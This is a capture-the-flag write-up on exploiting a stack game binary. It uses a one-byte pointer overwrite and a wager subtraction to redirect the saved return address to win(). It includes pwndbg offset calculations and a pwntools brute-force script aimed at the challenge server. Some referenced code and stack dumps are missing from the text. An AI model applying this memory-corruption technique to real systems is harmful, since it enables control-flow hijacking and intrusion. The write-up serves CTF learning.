So let's take a look at the code and see what it does:

```c
int main(void) {

    setbuf(stderr, NULL);

    int balance = 10;

```
We can see in the `main` function that it asks us for a name length and then checks if it's greater than 20 — if it is, it exits. Then it calls the `game` function, asks us for our name, and finally checks if our `balance` is greater than 999999999. If it is, it calls `win()`.

At first I thought I could set the name length to a value greater than 20 to overflow the `name` buffer, but then I realized the program exits if the length is greater than 20, so that won't work.

So I decided to take a look at the `game` function to see what it does:


As we can see, `balance` is a pointer to an integer and `wager` is a regular integer. The program asks us for an address and then checks if that address is greater than the address of `wager`. If it is, it prints "intruder neutralised". Otherwise, it asks us for a value and writes that single byte to the address we provided. So I thought I could change the value of `balance` directly by providing the address of `balance` and setting it to something greater than 999999999, so the final check in `main` would call `win()`.

But if we try that, we can see that the address of the `balance` variable is actually greater than the address of `wager`, so the check blocks us and we can't overwrite `balance` directly.

Another approach I considered was trying to win the game by exploiting the random number generator — basically predicting the next number. But the program doesn't ask you to guess the number, it just generates a random number itself and checks if it's equal to 1, so that won't work either.

But then I thought: if the program lets me change the value at any lower address, there must be a reason — the intended solution has to be to find a way to change `balance` indirectly.

After testing the program for like an hour, I noticed something interesting.

The value at `0x7fffffffc758` is the `balance` pointer itself — it points to where `balance` is stored (`0x7fffffffc79c`). So if we can make that pointer point somewhere else, we might be able to change the value at that new location instead of `balance`.

But at that moment I realized it only lets us change a single byte, so I can't overwrite the whole pointer.

So I spent like 15 minutes trying to figure out what to do.

Then I noticed this part of the code:

```c
 *balance -= wager;
 
 ```
This dereferences the `balance` pointer and subtracts our `wager` from whatever it points to. So if we can make the `balance` pointer point to a different location, we can subtract an arbitrary value from that location and effectively control what gets written there.

So what if we make it point to the saved return address of `main`, which is at:
```sh
07:0038│+008 0x7fffffffc788 —▸ 0x5555555555d4 (main+214) ◂— call flush
```
If we change the pointer to point to that address and then bet an amount equal to the offset between the current return address and the `win` function, the `*balance -= wager` will subtract that offset from the return address and redirect it to `win`.
Then on the next loop iteration we just bet `0` to quit the game, and when `game()` returns, instead of going back to `main+214`, it will return to `win()` and we'll get the flag.

But what's the offset between the pointer target and the return address? Now I had to figure it out.

```sh

pwndbg> p main
$1 = {int (void)} 0x14fe <main>
pwndbg> p win
$2 = {void (void)} 0x1219 <win>
```
As we can see, these are the addresses of `main` and `win`, so we can calculate the offset between them:

```sh
pwndbg> p 0x14fe - 0x1219
$3 = 741
```
But wait, the return address is not at the beginning of `main`, it's at `main+214`, so we have to add 214 to the offset:

```sh
pwndbg> p 741 + 214
$4 = 955
```
So the distance from the return address (`main+214`) to `win` is 955. If we bet 955, we'll change the return address to point to `win`.

So, looking again at our stack:


We can see that the `balance` pointer is stored at `0x7fffffffc758` and it currently points to `0x7fffffffc79c`, while the return address is at `0x7fffffffc788`. The last byte of the pointer is `0x9c`, and the last byte of the return address location is `0x88`. So if we overwrite only the last byte of the pointer with `0x88` (136), it will point to `0x7fffffffc788` — exactly where the return address is stored.

NOW I GOT THE FLAG, and I was so happy because I had spent like 2 hours trying to figure out what to do.

BUT when I tested the exploit on the remote it said:

```sh
child died
```

It didn't work, so what happened?

Well, we can confirm that we did change the pointer correctly.

The most reasonable explanation is that the offset on the remote is different.

Now I had to find the offset for the remote, and at first I thought it would be close to my local one, so I started testing manually from offset 935 to 960. It took me like 15 minutes.

But it didn't work 🫠

So I changed my strategy. I decided to make a script that would try all offsets from 750 to 925 and check if the flag appeared in the output.


```python
from pwn import *

for i in range(750, 925):
    for j in range(2):
        p = remote("chal.secso.cc", 4000)
        p.recvuntil("name to be?")
        p.sendline(b"2")

        p.recvuntil(b"0001")
        balance_address = p.recvuntil(b"0001").split(b" ")[-3][7:-1]
        val = p.recvuntil(b"[main]").split(b" ")
        main_addr = val[-6][7:-1]
        main_val = val[-5][:-1]
        p.info(f"Index {i}")
        p.info(f"Balance Addres {balance_address}")
        p.info(f"Main ret Addres {main_addr}")
        p.info(f"Min val: {main_val}")
        valueToChange = int(b"0x" + main_addr[-2:], 16)
        p.info(f"Value to change {valueToChange}")
        p.recvuntil(b"[addr]> ")
        p.sendline(balance_address)
        p.recvuntil(b"[value]>")
        p.sendline(str(valueToChange))
        p.recvuntil(b"wager>")
        p.sendline(str(i))
        changed_main_address = p.recvuntil(b"[main]").split(b" ")[-5][:-1]
        p.info(f"Changed main Address {changed_main_address}")
        p.recvuntil(b"wager>")
        p.sendline(b"0")
        funciono = p.recvall(timeout=2)
        if b"child died" in funciono or b"please" in funciono:
            if b"k17" in funciono:
                print("Funcionooooooooooooooooooooo")
            print("No funciono :(")
            p.close()
        else:
            print("Algo Diferente")
            p.info(f"Value to change {valueToChange}")
            p.info(f"Balance Addres {balance_address}")
            p.info(f"Main ret Addres {main_addr}")
            print(funciono)
            p.interactive()
            break

```
The reason for the two loops is that the outer loop is for the offset, and the inner loop tries twice because sometimes the remote address is different. For example:

If the address we need to overwrite is `0x7fffffffc7c7` and the return address of `main` is at `0x7fffffffc800`, remember we can only change the last byte. So if we change the last byte to `0x00` it will point to `0x7fffffffc700`, which is not the address we want, so we have to try again until the last byte lines up.
